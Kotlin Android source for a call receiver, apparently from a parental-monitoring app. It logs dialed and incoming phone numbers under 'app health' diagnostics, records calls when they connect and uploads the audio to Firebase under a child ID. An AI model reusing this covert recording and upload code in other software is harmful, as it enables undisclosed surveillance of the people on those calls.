package com.example.authapp.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.telephony.TelephonyManager
import androidx.core.content.ContextCompat
import com.example.authapp.analytics.AppHealthTelemetry
import com.example.authapp.data.AppPreferences
import com.example.authapp.data.FirebaseRepository
import com.example.authapp.recorder.CallRecorder
import com.example.authapp.service.ChildForegroundService
import com.google.firebase.crashlytics.FirebaseCrashlytics
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class CallReceiver : BroadcastReceiver() {

    companion object {
        private var callRecorder: CallRecorder? = null
        private var lastState = TelephonyManager.EXTRA_STATE_IDLE
        private var incomingNumber: String = ""
        private var isIncoming: Boolean = false
        private var callStartTime: Long = 0L

        fun getRecorder(context: Context): CallRecorder {
            if (callRecorder == null) {
                callRecorder = CallRecorder(context.applicationContext)
            }
            return callRecorder!!
        }

        fun resetStateForTesting() {
            lastState = TelephonyManager.EXTRA_STATE_IDLE
            incomingNumber = ""
            isIncoming = false
            callStartTime = 0L
        }
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_NEW_OUTGOING_CALL) {
            val outNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER) ?: ""
            if (outNumber.isNotEmpty()) {
                incomingNumber = outNumber
                isIncoming = false
                AppHealthTelemetry.logDiagnostic(
                    context,
                    "CALL_MONITORING",
                    "OUTGOING_DIAL",
                    "Outgoing phone call dialed to: $outNumber"
                )
            }
            return
        }

        if (intent.action != TelephonyManager.ACTION_PHONE_STATE_CHANGED) return

        val stateStr = intent.getStringExtra(TelephonyManager.EXTRA_STATE) ?: return
        val number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER) ?: ""
        if (number.isNotEmpty()) {
            incomingNumber = number
        }

        when (stateStr) {
            TelephonyManager.EXTRA_STATE_RINGING -> {
                isIncoming = true
                lastState = TelephonyManager.EXTRA_STATE_RINGING
                AppHealthTelemetry.logDiagnostic(
                    context,
                    "CALL_MONITORING",
                    "RINGING",
                    "Phone ringing: $incomingNumber"
                )
            }
            TelephonyManager.EXTRA_STATE_OFFHOOK -> {
                // Call answered or outgoing dialed
                if (lastState != TelephonyManager.EXTRA_STATE_OFFHOOK) {
                    lastState = TelephonyManager.EXTRA_STATE_OFFHOOK
                    callStartTime = System.currentTimeMillis()
                    AppHealthTelemetry.logDiagnostic(
                        context,
                        "CALL_MONITORING",
                        "OFFHOOK",
                        "Call active (connected) for: $incomingNumber"
                    )

                    val serviceIntent = Intent(context, ChildForegroundService::class.java).apply {
                        action = ChildForegroundService.ACTION_START_CALL_RECORDING
                        putExtra(ChildForegroundService.EXTRA_PHONE_NUMBER, incomingNumber)
                    }
                    try {
                        ContextCompat.startForegroundService(context, serviceIntent)
                    } catch (e: Exception) {
                        AppHealthTelemetry.logDiagnostic(
                            context,
                            "CALL_MONITORING",
                            "FAILED",
                            "Foreground service start error, fallback to direct recorder: ${e.localizedMessage}",
                            e.localizedMessage
                        )
                        getRecorder(context).startCallRecording(incomingNumber)
                    }
                }
            }
            TelephonyManager.EXTRA_STATE_IDLE -> {
                // Call terminated
                if (lastState == TelephonyManager.EXTRA_STATE_OFFHOOK) {
                    lastState = TelephonyManager.EXTRA_STATE_IDLE
                    val durationSeconds = if (callStartTime > 0L) {
                        (System.currentTimeMillis() - callStartTime) / 1000
                    } else 0L

                    AppHealthTelemetry.logDiagnostic(
                        context,
                        "CALL_MONITORING",
                        "ENDED",
                        "Call finished with duration: ${durationSeconds}s"
                    )

                    val serviceIntent = Intent(context, ChildForegroundService::class.java).apply {
                        action = ChildForegroundService.ACTION_STOP_CALL_RECORDING
                    }
                    try {
                        ContextCompat.startForegroundService(context, serviceIntent)
                    } catch (e: Exception) {
                        val recordedFile = getRecorder(context).stopCallRecording()
                        if (recordedFile != null && recordedFile.exists() && recordedFile.length() > 0) {
                            val currentUid = AppHealthTelemetry.getEffectiveUserId(context)
                            if (currentUid.isNotEmpty()) {
                                CoroutineScope(Dispatchers.IO).launch {
                                    try {
                                        val fileUri = Uri.fromFile(recordedFile)
                                        FirebaseRepository.uploadRecordingFile(
                                            childId = currentUid,
                                            fileUri = fileUri,
                                            streamType = "call",
                                            durationSeconds = durationSeconds,
                                            localFilePath = recordedFile.absolutePath
                                        )
                                    } catch (err: Exception) {
                                        AppHealthTelemetry.logDiagnostic(
                                            context,
                                            "CALL_MONITORING",
                                            "FAILED",
                                            "Direct call upload failed: ${err.localizedMessage}",
                                            err.localizedMessage
                                        )
                                    }
                                }
                            }
                        }
                    }
                    incomingNumber = ""
                    isIncoming = false
                    callStartTime = 0L
                } else {
                    lastState = TelephonyManager.EXTRA_STATE_IDLE
                }
            }
        }
    }
}
